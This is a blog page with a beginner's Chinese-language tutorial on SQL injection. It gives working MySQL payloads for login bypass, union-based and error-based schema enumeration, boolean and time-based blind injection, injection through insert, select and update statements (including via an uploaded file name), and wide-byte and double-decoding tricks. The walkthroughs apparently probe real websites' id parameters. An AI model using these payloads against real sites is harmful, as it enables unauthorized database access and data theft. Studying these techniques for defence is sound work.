<!--
	作者：Sariay
	时间：2018-09-25
	描述：There may be a bug, but don't worry, QiLing(器灵) says that it can work normally!
-->


	<!DOCTYPE html>
	<html>
		

<head><meta name="generator" content="Hexo 3.8.0">
	<title>ning blog</title>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="apple-mobile-web-app-title" content="Amaze UI">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
    <meta name="author" content="ning">
    <meta name="keywords" content="safe">
    <meta name="description" content="">
   	<!-- css -->
	<link rel="stylesheet" href="/css/style.css">

	<!-- favicon -->
	<link href="/img/favicon.ico" rel="Shortcut Icon" type="image/ico">
	
	<!-- font-awesome -->
	<link href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
</head>
	<body>	
		<!--Preloader-->
<div id="preloader">
	<div id="status">
		<img alt="PRELOADER" src="/img/logo.png">
	</div>
</div>
<!--Preloader end-->

<!-- header -->

	<header id="header-bg-2">

	
		<div id="cd-logo"><a href="/"><img src="/img/logo.png" alt="Logo"></a></div>
	
	
	<!-- motto or description -->
		
 		<p class="motto"></p>
	
	
	<!-- current page name or title -->
	
		
		
			
			<p class="page-name">当前文章&nbsp;:&nbsp;《》</p>
			
		
	
	
	<!-- others: such as change-bg, time... -->
	<p class="page-name-other">
		1/5/2019 
		<style type="text/css">
	header:after {
		content: '';
		position: relative;
		top: 0;
		left: 0;
		height: 100%;
		width: 100%;
		background: #222222;
		opacity: .5;
		z-index: -1;
	}
	
	.change-header-bg{
		font-style: normal;
	}
	.change-header-bg i{
		text-align: center;
		cursor: pointer;
		pointer-events: bounding-box;
	}
	@media(max-width:512px) {
		.change-header-bg {
			display: none;
			visibility: hidden;
		}
	}
	
</style>

<script type="text/javascript">
	function changeHeaderBg(){
		var random_bg = Math.floor(Math.random() * 109 + 1);
		var bg = 'url(https://XXX-youname-XXX.github.io/Random-img/' + random_bg + '.jpg)';
		$("#header-bg-2").css("background-image", bg);
	}
</script>

<span class="change-header-bg">
	——&nbsp;<i class="fa fa-camera-retro" onclick="changeHeaderBg()"></i>	
</span>
	</p>		
</header>

<!-- nav -->
<div id="cd-nav">
	<a href="#0" title="menu" class="cd-nav-trigger"><span></span></a>

	<nav id="cd-main-nav">
		<ul>
			
      		<li class="fa fa-/">
           		<a href="/" title="主页">主页</a>	
      		</li>
    		
      		<li class="fa fa-/archives">
           		<a href="/archives" title="归档">归档</a>	
      		</li>
    		
      		<li class="fa fa-/categories">
           		<a href="/categories" title="分类">分类</a>	
      		</li>
    		
      		<li class="fa fa-/tags">
           		<a href="/tags" title="标签">标签</a>	
      		</li>
    		
      		<li class="fa fa-/about">
           		<a href="/about" title="关于">关于</a>	
      		</li>
    		
      		<li class="fa fa-/gallery">
           		<a href="/gallery" title="相册">相册</a>	
      		</li>
    		
    		
        	
		</ul>
	</nav>
</div>

		<!--main-->
		<main> 
		<div class="page-container">
		<!-- content srart -->
<div class="am-g am-g-fixed blog-fixed blog-content">
	<div class="am-u-md-8 am-u-sm-12">

		<article class="am-article blog-article-p">

			<div class="am-article-hd">
				

				<h1 class="am-article-title blog-text-center">
					
					
				</h1>

				<p class="am-article-meta blog-text-center">
					<span>
						<i class="fa fa-clock-o"></i> 
						<a href="/2019/01/01/sql注入篇/" itemprop="url">
	<time datetime="2019-01-01T14:08:17.827Z" itemprop="datePublished">
  		2019-01-01
  </time>
</a>    
&nbsp;
					</span>
					
					<span>						
						
					</span>
				</p>
			</div>

			<div class="am-article-bd">
				<div class="content" id="post-content">
					
						<h2 id="sql注入入门篇："><a href="#sql注入入门篇：" class="headerlink" title="sql注入入门篇："></a>sql注入入门篇：</h2><p>#### </p>
<h4 id="SQL注入介绍"><a href="#SQL注入介绍" class="headerlink" title="SQL注入介绍"></a>SQL注入介绍</h4><h5 id="SQL注入介绍："><a href="#SQL注入介绍：" class="headerlink" title="SQL注入介绍："></a>SQL注入介绍：</h5><p>​        sql注入指sql命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的sql命令</p>
<h5 id="SQL注入原理："><a href="#SQL注入原理：" class="headerlink" title="SQL注入原理："></a>SQL注入原理：</h5><p>​        当web应用向后台数据库传递失去了语句进行数据库操作时，如果对用户输入的参数没有进行严格的过滤，那么攻击者就可以构造特殊的SQL语句，直接输入数据库引擎执行，获取或者修改数据库中的内容。</p>
<h5 id="SQL注入本质："><a href="#SQL注入本质：" class="headerlink" title="SQL注入本质："></a>SQL注入本质：</h5><p>​        把用户输入的数据当作代码来执行，违背了”数据与代码分离“的原则</p>
<h5 id="SQL注入漏洞的关键条件："><a href="#SQL注入漏洞的关键条件：" class="headerlink" title="SQL注入漏洞的关键条件："></a>SQL注入漏洞的关键条件：</h5><p>​        用户能控制输入的内容</p>
<p>​        web应用把用户输入的内容带到数据库中执行</p>
<h5 id="sql注入可以做哪些事情"><a href="#sql注入可以做哪些事情" class="headerlink" title="sql注入可以做哪些事情"></a>sql注入可以做哪些事情</h5><p>获取数据</p>
<p>修改数据</p>
<p>上传文件</p>
<p>读取文件</p>
<h4 id="数据库基础"><a href="#数据库基础" class="headerlink" title="数据库基础"></a>数据库基础</h4><p>​        我的博客，里面介绍了要掌握的东西：<a href="https://padsidwwq.github.io/2018/12/23/PHP%E4%B8%8EMySQL/">https://padsidwwq.github.io/2018/12/23/PHP%E4%B8%8EMySQL/</a></p>
<p>常用函数：</p>
<p>​        </p>
<table>
<thead>
<tr>
<th style="text-align:center">函数</th>
<th style="text-align:center">用法</th>
<th>作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">user()</td>
<td style="text-align:center">select user()</td>
<td>查询当前用户</td>
</tr>
<tr>
<td style="text-align:center">version()</td>
<td style="text-align:center">select version()</td>
<td>查看当前数据库版本</td>
</tr>
<tr>
<td style="text-align:center">database()</td>
<td style="text-align:center">select database()</td>
<td>返回当前进入(使用)的数据库</td>
</tr>
<tr>
<td style="text-align:center"><strong>concat()</strong></td>
<td style="text-align:center"><strong>select concat()</strong></td>
<td><strong>用于将多个字符串连接成一个</strong></td>
</tr>
<tr>
<td style="text-align:center">concat_ws()</td>
<td style="text-align:center">select concat_ws(\</td>
<td>,a,b,c)</td>
<td>第一个参数为分隔符，并进行拼接 `ex:a</td>
<td>b</td>
<td>c`</td>
</tr>
<tr>
<td style="text-align:center">substr()</td>
<td style="text-align:center">select substr(‘abc’,1,1)</td>
<td>截取字符串的一部分 第一个参数截取谁的，第二个是从哪开始，第三个参数是截取多少个</td>
</tr>
<tr>
<td style="text-align:center">left()</td>
<td style="text-align:center">select left()</td>
<td>从左边开始截取字符串，第一个参数是被截取的，第二个是截取谁的</td>
</tr>
<tr>
<td style="text-align:center">right()</td>
<td style="text-align:center">sleect right()</td>
<td>从右边开始截取字符串，第一个参数是被截取的，第二个是截取谁的</td>
</tr>
<tr>
<td style="text-align:center">length()</td>
<td style="text-align:center">select length(‘nin’)</td>
<td>返回字符串的长度</td>
</tr>
<tr>
<td style="text-align:center">ascii()</td>
<td style="text-align:center">ascii(‘a’)</td>
<td>转换为ASCII码，一次只能转换一个</td>
</tr>
<tr>
<td style="text-align:center">order by</td>
<td style="text-align:center"></td>
<td>将select查询结果升序/降序排列</td>
</tr>
<tr>
<td style="text-align:center">union select</td>
<td style="text-align:center">select 1 from 1 union select 2 from 2</td>
<td>联合查询，两次查询结果要列数相等，并且第一个的查询结果为表头</td>
</tr>
<tr>
<td style="text-align:center"></td>
<td style="text-align:center"></td>
</tr>
</tbody>
</table>
<h5 id="条件判断函数："><a href="#条件判断函数：" class="headerlink" title="条件判断函数："></a>条件判断函数：</h5><p>IF        if(agr1,arg2,arg3)</p>
<p>​        arg1为判断条件，arg2为真的返回结果，arg3为假的返回结果</p>
<p>CASE WHEN   case when arg1 when arg2 else arg3 end</p>
<p>​        arg 1为判断条件，arg2为真的结果，arg3为假的返回结果</p>
<h5 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h5><p>nformation_schema        库存放所有的数据库信息，是公用的（任何用户都可以访问）<br>information_schema.SCHEMATA     表中schema_name字段存放了所有的数据库名字<br>information_schema.TABLES    表中table_name字段存放了所有的表名字，table_schema字段存储表所属的库名字</p>
<p>information_schema.COLUMNS      表column_name中存放了所有的字段名字，table_name字段存放了所属表的名字，table_schema字段存储表所属的库名字</p>
<p>所以以下命令：</p>
<p>查询数据库中有那些库<br>​    select schema_name from information_schema.SCHEMATA<br>查询数据库中有那些表<br>​    select table_name from information_schema.TABLES<br>查询数据库中test库中有哪些表<br>​    select table_name from information_schema.TABLES where table_schema = ‘test’  // test 可以写成 0x7a73<br>查询数据库中有那些字段<br>​    select column_name from information_schema.COLUMNS<br>查询数据库中test库中user表有哪些字段<br>​    select column_name from information_schema.COLUMNS where table_schema = ‘test’ and table_name = ‘user’</p>
<p>​    </p>
<h4 id="根据注入点的参数类型分类"><a href="#根据注入点的参数类型分类" class="headerlink" title="根据注入点的参数类型分类"></a>根据注入点的参数类型分类</h4><h5 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h5><p>1’ or 1=1 #</p>
<p>示例</p>
<p>select * from users where id = ‘1’ or 1=1 #</p>
<p>剖析：</p>
<p>使用<code>&#39;</code>把id=’1’标签闭合掉，后面加or判断，结果为真，后面#号注释掉造成万能登陆。</p>
<p>sql注入，从代码角度来看分为数字型和字符型，又根据字符型和数字型可以外加()和字符型能使用双引号和单引号</p>
<h5 id="纯数字型"><a href="#纯数字型" class="headerlink" title="纯数字型"></a>纯数字型</h5><p>1 and 1=1 #</p>
<p>select * from users where id = 1 and 1=1#</p>
<p>由于是纯数字型的，所以不加单引号。</p>
<h5 id="只加单引号"><a href="#只加单引号" class="headerlink" title="只加单引号"></a>只加单引号</h5><p>1’ or 1=1#</p>
<p>select * from users where id = ‘1’  or 1=1 #</p>
<p>使用<code>&#39;</code>把id=’1’标签闭合掉，后面加or判断，结果为真，后面#号注释掉。</p>
<h5 id="只加双引号"><a href="#只加双引号" class="headerlink" title="只加双引号"></a>只加双引号</h5><p>1” or 1=1 #</p>
<p>select * from users where id = “1”  or 1=1 #</p>
<p>使用<code>&#39;&#39;</code>把id=’1’标签闭合掉，后面加or判断，结果为真，后面#号注释掉。</p>
<h5 id="数字加括号"><a href="#数字加括号" class="headerlink" title="数字加括号"></a>数字加括号</h5><p>1) or 1=1 #</p>
<p>select * from users where (id = 1)   </p>
<p>使用<code>)</code>把id=’1’标签闭合掉，后面加or判断，结果为真，后面#号注释掉。</p>
<h5 id="双引号加括号"><a href="#双引号加括号" class="headerlink" title="双引号加括号"></a>双引号加括号</h5><p>1”) or 1=1 #</p>
<p>select * from users where (id = ‘1’)</p>
<p>使用<code>&#39;  )</code>把id=’1’标签闭合掉，后面加or判断，结果为真，后面#号注释掉。</p>
<h5 id="单引号加括号"><a href="#单引号加括号" class="headerlink" title="单引号加括号"></a>单引号加括号</h5><p>1’) or 1=1 #</p>
<p>select * from users where (id = ‘1’)</p>
<p>使用<code>&quot;  )</code>把id=’1’标签闭合掉，后面加or判断，结果为真，后面#号注释掉。</p>
<h4 id="根据注入点反馈类型分类"><a href="#根据注入点反馈类型分类" class="headerlink" title="根据注入点反馈类型分类"></a>根据注入点反馈类型分类</h4><h5 id="基于union类型的SQL注入"><a href="#基于union类型的SQL注入" class="headerlink" title="基于union类型的SQL注入"></a>基于union类型的SQL注入</h5><p>1.首先查找注入点，找到一个网站，在ID后面加上单引号看一下页面是否会发生变化。 id=1372’</p>
<p><img src="/photo/1546340290957.png" alt="1546340290957"></p>
<p><img src="/photo/1546340342291.png" alt="1546340342291"></p>
<p>2.页面有变化，加上#号查看页面是否变回来。 id = 1372’%23     （#号的url编码为%23，’号的url编码为%27，空格为%20）</p>
<p><img src="/photo/1546340406829.png" alt="1546340406829"></p>
<p>3.页面没有变回原样，表明不是单引号类型的注入，再在单引号后面加上括号看是否变回来。 </p>
<p><img src="/photo/1546340556613.png" alt="1546340556613"></p>
<p>4.页面没有变回原样，我们看下是否是纯数字型的注入 and 1</p>
<p><img src="/photo/1546340749755.png" alt="1546340749755"></p>
<p>5.可以判断为纯数字型注入，下面来猜测行数 使用order by 来判断，将order by = 11直接加在id=1377后面。，当然这个需要猜测，如果大于了行数页面就会发生变化。</p>
<p><img src="/photo/1546341063526.png" alt="1546341063526"></p>
<p>6.经过猜测，行数为11行，然后用union select 来进行需要的数据的查询。</p>
<p><img src="/photo/1546341264031.png" alt="1546341264031"></p>
<p>7.此时，我们发现我们查询的内容不能显示，这里我们要把ID改成一个不可能存在的数值，比如负数。</p>
<p><img src="/photo/1546341351139.png" alt="1546341351139"></p>
<p>8.看到页面已经有变化，我们把5的位置替换成user()来查看当前数据库的用户名。</p>
<p><img src="/photo/1546341509421.png" alt="1546341509421"></p>
<p>9.我们现在开始查看这个数据库中一共有多少的库，使用select schema_name from information_schema.SCHEMATA来查询。当然我们在页面里不能这么直接写，尝试直接将查询数据库的语句放入到3位，发现执行错误，尝试在sql语句两侧加入(),发现还是错误，再加入group_concat，返现正常查询出所有的数据库名字。<br>​        首先关于直接放sql语句，这个是不符合代码规范， 需要用()扩起来<br>​        加入group_concat恢复正常，是因为查询所有的库名字时，返回的结果是多行，而union select 的第3位，是只能写单行内容，所以用group_concat进行组合成一行。所以最终的代码是<code>(select group_concat(schema_name) from information_schema.schemata)</code></p>
<p><img src="/photo/1546341786086.png" alt="1546341786086"></p>
<p>10.我们得到了数据库之后，再查询库里面的表的信息，用(select group_concat(table_name) from information_schema.tables where table_schema =’dbname’)%23。</p>
<p><img src="/photo/1546342201119.png" alt="1546342201119"></p>
<p>11.得到表名然后再查字段名。(select group_concat(column_name) from information_schema.COLUMNS where table_schema=’dbname’ and table_name=’tbname’)</p>
<p><img src="/photo/1546342755346.png" alt="1546342755346"></p>
<p>完成。</p>
<h5 id="基于错误显示的sql注入"><a href="#基于错误显示的sql注入" class="headerlink" title="基于错误显示的sql注入"></a>基于错误显示的sql注入</h5><p>十种MySQL报错注入：<a href="https://www.cnblogs.com/wocalieshenmegui/p/5917967.html" target="_blank" rel="noopener">https://www.cnblogs.com/wocalieshenmegui/p/5917967.html</a></p>
<p>1.首先查找注入点，找到一个网站，在ID后面加上单引号看一下页面是否会发生变化。 id=100462‘</p>
<p><img src="/photo/1546343596867.png" alt="1546343596867"></p>
<p>2.使用报错函数来让他输出数据库的信息。比如查看数据库的登陆账户，直接在id=100462’后面加and (select 1 from (select count(<em>),concat(user(),floor(rand(0)</em>2))x from information_schema.tables group by x)a)</p>
<p><img src="/photo/1546343866444.png" alt="1546343866444"></p>
<p>3.我们得到了数据库的用户名，下面我们来获取MySQL的下所有的库</p>
<p>and (extractvalue(1,concat(0x7e,(select group_concat(schema_name) from information_schema.schemata),0x7e)))</p>
<p><img src="/photo/1546346492334.png" alt="1546346492334"></p>
<p>4.发现只能显示出来30个字符，用mid函数来分别取出来。</p>
<p>and (extractvalue(1,concat(0x7e,mid((select group_concat(schema_name) from information_schema.schemata),29,59),0x7e)))</p>
<p><img src="/photo/1546346601860.png" alt="1546346601860"></p>
<p>第二种方法</p>
<p>and (select 1 from (select count(<em>),concat((select mid(group_concat(schema_name),1,100) from information_schema.schemata),floor(rand(0)</em>2))x from information_schema.tables group by x)a)</p>
<p>这种方法可以直接取出来所有的内容，不用分段取出来。</p>
<p><img src="/photo/1546349508316.png" alt="1546349508316"></p>
<p>然后一点点取出想要的内容。</p>
<h5 id="基于布尔盲注"><a href="#基于布尔盲注" class="headerlink" title="基于布尔盲注"></a>基于布尔盲注</h5><p>原网页：</p>
<p><img src="/photo/1546350685308.png" alt="1546350685308"></p>
<p>1.首先查找注入点，找到一个网站，在ID后面加上单引号看一下页面是否会发生变化。 id=100462‘，页面发生了变化所以试探数据库版本长度。</p>
<p><img src="/photo/1546343596867.png" alt="1546343596867"></p>
<p>2.获取数据库的长度 and (length(database()))&gt;9，一点点的试出来当数据库名的长度</p>
<p><img src="/photo/1546350835834.png" alt="1546350835834"></p>
<p>3.网页发生了变化，代表长度不对，and (length(database()))=8，一点点的试出来当数据库名的长度</p>
<p><img src="/photo/1546350902262.png" alt="1546350902262"></p>
<p>4.网页恢复正常，代表数据库名为8位，然后ASCII码来一点点试出数据库名 and (ascii(submit(database(),1,1)))&gt;100</p>
<p><img src="/photo/1546351127925.png" alt="1546351127925"></p>
<p>5.网页正常，代表ASCII码大于100，继续试and (ascii(mid(database(),1,1)))=117</p>
<p><img src="/photo/1546351228068.png" alt="1546351228068"></p>
<p>6.数据库第一个字符就出来了，117对应着大写字母u</p>
<p>以此类推。</p>
<h5 id="基于时间延迟的盲注"><a href="#基于时间延迟的盲注" class="headerlink" title="基于时间延迟的盲注"></a>基于时间延迟的盲注</h5><p>时间延迟的盲注用于布尔盲注页面不变化的时候。</p>
<p>select if(length(version())&gt;15,sleep(3),1);查看版本号的长度</p>
<p>select if(ascii(substr(version(),1,1))&gt;49,’true’,’fals’);   查数据库版本的第一位数</p>
<p>1.先找到注入点：</p>
<p>原网页</p>
<p><img src="/photo/1546685145435.png" alt="1546685145435"></p>
<p>2.找到了一个纯数字的注入点：id = 1 and 1 %23</p>
<p><img src="/photo/1546685176645.png" alt="1546685176645"></p>
<p>3.测试是否存在延迟注入 id = 1 and sleep(5) %23</p>
<p><img src="/photo/1546685354700.png" alt="1546685354700"></p>
<p>4.发现有延迟注入，接下来测试版本号长度：id=1 and if(length(version())&gt;20,sleep(5),0) %23，发现版本号不大于20位</p>
<p><img src="/photo/1546685535930.png" alt="1546685535930"></p>
<p>5.继续测试，使用payload：id=1%20and%20if(length(version())%3E25,sleep(3),0)%23，发现没有延迟，说明长度不大于25位</p>
<p><img src="/photo/1546685731161.png" alt="1546685731161"></p>
<p>6.最后测试出数据库的来版本号位长度为24位。 payload：id=1 and if(length(version())=24,sleep(3),0)%23</p>
<p><img src="/photo/1546685874306.png" alt="1546685874306"></p>
<p>7.测试数据库版本信息，使用payload：id=1 and if(ascii(substr(version(),1,1))&gt;50,sleep(5),0) %23</p>
<p>发现界面没有延迟，说明数据库版本第一位ascii码不大于50</p>
<p><img src="/photo/1546686088629.png" alt="1546686088629"></p>
<p>8.最后测试ascii为49  payload：id=1 and if(ascii(substr(version(),1,1))=49,sleep(5),0)%23</p>
<p><img src="/photo/1546686202846.png" alt="1546686202846"></p>
<p>以此类推一点点跑出想要的数据。</p>
<h5 id="基于insert语句的盲注："><a href="#基于insert语句的盲注：" class="headerlink" title="基于insert语句的盲注："></a>基于insert语句的盲注：</h5><p>举个例子：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">源码insert语句：</span><br><span class="line">insert into messages (title,message,time,content,author) values (&apos;hello&apos;,&apos;123&apos;,&apos;2018&apos;,&apos;123&apos;,&apos;admin&apos; );</span><br><span class="line"></span><br><span class="line">简化：insert into messages (key1,key2,key3,....) values (&apos;val1&apos;,&apos;val2&apos;,&apos;val3&apos;,......);</span><br><span class="line"></span><br><span class="line">从代码看出，如果我们输入的值的个数与表的列数不匹配，则MySQL就会报错导致失败，所以我们需要先算出messages的列数，然后在值里面放入恶意代码</span><br></pre></td></tr></table></figure>
<p>先查找注入点，在能输入数据的地方测试，insert注入要测出表的列数，否则注入失败</p>
<p>根据上面的例子， 然后我们写出了下面的代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">123&apos;) #			insert into messages (key1,key2,key3,....) values (&apos;123&apos;)#.)</span><br><span class="line">123&apos;,1) #		insert into messages (key1,key2,key3,....) values (&apos;123&apos;,1)#.)</span><br><span class="line">123&apos;,1,1) #		insert into messages (key1,key2,key3,....) values (&apos;123&apos;,1,1)#.)</span><br><span class="line">123&apos;,1,1,1) #	insert into messages (key1,key2,key3,....) values (&apos;123&apos;,1,1,1)#.)</span><br><span class="line">123&apos;,1,1,1.....) #	insert into messages (key1,key2,key3,....) values (&apos;123&apos;,1.....)#.)</span><br></pre></td></tr></table></figure>
<p>如图：</p>
<p><img src="/photo/1546436178572.png" alt="1"></p>
<p>经测试一共有三列可以，然后把代码替换成恶意代码</p>
<p><img src="/photo/1546436231201.png" alt=""></p>
<h5 id="基于select语句的盲注："><a href="#基于select语句的盲注：" class="headerlink" title="基于select语句的盲注："></a>基于select语句的盲注：</h5><p>登录注册或者搜索的地方一般会用select语句</p>
<p><img src="/photo/1546483234451.png" alt=""></p>
<p>如上图是一个登录框，如果这里存在注入我们就可以用以下方法。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">如果知道用户名则用root&apos; and  sleep(1) #</span><br><span class="line">如果不知道用户名则用root&apos; or sleep(1) #</span><br></pre></td></tr></table></figure>
<p>然后我们就可以一点点跑出想要的数据</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root&apos; and if(ascii(mid(version(),1,1))&gt;1,sleep(1),1) #</span><br></pre></td></tr></table></figure>
<h5 id="基于update的语句"><a href="#基于update的语句" class="headerlink" title="基于update的语句"></a>基于update的语句</h5><p><img src="/photo/1546485004137.png" alt="1546485004137"></p>
<p>如图，上传图片的地方用的是update的语句，可以更改文件名来进行盲注攻击。</p>
<p>原名称<code>a.jpg</code></p>
<p>更改为<code>a&#39; where id = 1 and sleep(3) #.jpg</code> 先查找id = 1 是否存在</p>
<p>然后进行盲注攻击。</p>
<h5 id="宽字节注入："><a href="#宽字节注入：" class="headerlink" title="宽字节注入："></a>宽字节注入：</h5><p>当数据库的编码为gbk时，才可以使用此注入。</p>
<p>由于一般的网站会用函数对SQL语句进行过滤，把<code>&#39;</code>、<code>&quot;</code>等进行<code>\</code>转义</p>
<p>在使用PHP连接MySQL的时候，当设置数据库的编码为gbk是会导致一个编码转换注入的问题，可以把转义的<code>\</code>吃掉，也就是宽字节注入。</p>
<p><img src="/photo/1546696421942.png" alt="1546696421942"></p>
<h5 id="二次解码注入："><a href="#二次解码注入：" class="headerlink" title="二次解码注入："></a>二次解码注入：</h5><p>url编码背景：</p>
<p>URL参数字符串中使用key=value键值对这样的形式来传参，键值对之间以&amp;符号分隔，如<code>/?name=abc&amp;pwd=123</code>如果你的value字符串中包含了=或者&amp;，那么势必会造成接收Url的服务器解析错误，因此必须将引起歧义的&amp;和= 符号进行转义，也就是对其进行编码</p>
<p>但是浏览器会自动对url编码进行解码，但是可能会解码不完全，所以会用<code>urldecode</code>来进行再次解码。</p>
<p>例如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//用GET方式获取id值，并对其中的特殊字符进行转义</span><br><span class="line">$id = mysql_real_escap_string($_GET[‘id‘]);</span><br><span class="line">//使用urldecode()函数进行解码</span><br><span class="line">$id = urldecode($id);</span><br><span class="line"></span><br><span class="line">$sql = &quot;SELECT * FROM usres WHERE id = ‘$id‘ LIMIT 0,1;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>
<p>所以就造成二次解码注入</p>
<p>例如：<code>http://127.0.0.1/sql.php?id=1%2527</code></p>
<p>剖析：浏览器第一次对url解码时会把%25解码成%号，因为<code>%</code>的url编码就是<code>%25</code>，然后PHP再次解码时就会变成<code>%27</code>也就是<code>&#39;</code></p>

					
				</div>
			</div>
		</article>

		<ul class="am-pagination">
    
	
		<li class="am-pagination-next">
		<a class="pull-right" href="/2018/12/23/PHP与MySQL/" title="PHP与MySQL">
			下一篇 &raquo;
		</a>
		</li>
	 
 </ul>
        

		<div class="theme-annie-comment-button-container">
	<button id="annie-comment-button" class="theme-annie-comment-button" onclick="Annie_Comment()">
		加载评论
		<!--加载评论-->
	</button>
</div>

<div id="annie-comment-container" class="theme-annie-comment-main-container">

	
		
			<!-- comment valine -->
			<!-- show valine comment -->
<div id="valineComment" class="comment"></div>

<!-- valine`s js & css -->
<script>
	window.jQuery || document.write('<script src="/js/jquery-2.1.1.min.js"><\/script>')
</script>
<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
<script src="/js/valine.min.js"></script>
<link rel="stylesheet" href="/css/comment.css">

<script>
	var checkExistComment = setInterval(function() {
		if( $('#valineComment').length ) {
			new Valine({
				// AV 对象来自上面引入av-min.js(老司机们不要开车➳♡゛扎心了老铁)
				av: AV,
				//使用id寻找div元素（使用class可能找不到）
				el: '#valineComment',
				emoticon_url: 'https://cloud.panjunwen.com/alu',
				emoticon_list: ["吐.png", "期待.png", "高兴.png", "吐血倒地.png", "哭泣.png", "欢呼.png"],
				app_id: "3333....", //获取APP ID
				app_key: "3333......", //获取APP KEY
				placeholder: "no any!", //评论框占位提示文字        			
			});
			clearInterval(checkExistComment);
		}
	}, 100);
</script>
		
	

</div>

<script type="text/javascript">
	/* Show Comment */
	var Annie_Comment = function() {
		function Show_Hidden(obj) {
			obj.style.display = 'block';
		}
		
		//var obutton = $('#annie-comment-button');
		//var obutton = $('#annie-comment-container');
		var obutton = document.getElementById("annie-comment-button" || "0");
		var odiv = document.getElementById("annie-comment-container");
		if( 'obutton' ) {
			obutton.onclick = function() {
				Show_Hidden(odiv);
				$("#annie-comment-button").css("display", 'none');
				return false;
			}
		}
	};

	(function Annie_Init() {
		Annie_Comment();
	})();
</script>
		
		<!--
	时间：2018-09-24
	描述：The TOC module refers to 'https://github.com/codefine/hexo-theme-mellow', include toc.ejs、toc.js、toc.css. All rights reserved by codefine. 
-->

	
		<aside class="post-widget">
			<nav class="post-toc-wrap" id="post-toc">
				
					<strong>文章目录</strong>
				
				
				<!--toc(post.content)-->
				<ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#sql注入入门篇："><span class="post-toc-text">sql注入入门篇：</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#SQL注入介绍"><span class="post-toc-text">SQL注入介绍</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#SQL注入介绍："><span class="post-toc-text">SQL注入介绍：</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#SQL注入原理："><span class="post-toc-text">SQL注入原理：</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#SQL注入本质："><span class="post-toc-text">SQL注入本质：</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#SQL注入漏洞的关键条件："><span class="post-toc-text">SQL注入漏洞的关键条件：</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#sql注入可以做哪些事情"><span class="post-toc-text">sql注入可以做哪些事情</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#数据库基础"><span class="post-toc-text">数据库基础</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#条件判断函数："><span class="post-toc-text">条件判断函数：</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#information-schema"><span class="post-toc-text">information_schema</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#根据注入点的参数类型分类"><span class="post-toc-text">根据注入点的参数类型分类</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#万能密码"><span class="post-toc-text">万能密码</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#纯数字型"><span class="post-toc-text">纯数字型</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#只加单引号"><span class="post-toc-text">只加单引号</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#只加双引号"><span class="post-toc-text">只加双引号</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#数字加括号"><span class="post-toc-text">数字加括号</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#双引号加括号"><span class="post-toc-text">双引号加括号</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#单引号加括号"><span class="post-toc-text">单引号加括号</span></a></li></ol></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#根据注入点反馈类型分类"><span class="post-toc-text">根据注入点反馈类型分类</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#基于union类型的SQL注入"><span class="post-toc-text">基于union类型的SQL注入</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#基于错误显示的sql注入"><span class="post-toc-text">基于错误显示的sql注入</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#基于布尔盲注"><span class="post-toc-text">基于布尔盲注</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#基于时间延迟的盲注"><span class="post-toc-text">基于时间延迟的盲注</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#基于insert语句的盲注："><span class="post-toc-text">基于insert语句的盲注：</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" href="#基于select语句的盲注："><span class="post-toc-text">基于select语句的盲注：</span></a></li><li class="post-toc-item post-toc-level-5"><a class="post-toc-link" 